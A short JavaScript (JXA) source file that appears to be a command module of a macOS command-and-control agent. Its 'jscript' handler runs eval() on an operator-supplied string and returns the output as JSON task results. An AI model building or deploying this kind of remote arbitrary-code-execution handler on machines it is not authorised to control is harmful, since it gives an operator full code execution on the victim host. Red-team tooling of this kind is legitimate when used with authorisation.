exports.jscript = function(task, command, params){
	//simply eval a javascript string and return the response
	let response = "";
	try{
		response = ObjC.deepUnwrap(eval(params));
	}
	catch(error){
		return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
	}
	if(response === undefined || response == ""){
	    response = "No Command Output";
	}
	if(response == true){
	    return "True";
	}
	if(response == false){
	    return "False";
	}
	if(typeof(response) != "string"){
	    response = String(response);
	}
	return JSON.stringify({"user_output":response, "completed": true});
};
COMMAND_ENDS_HERE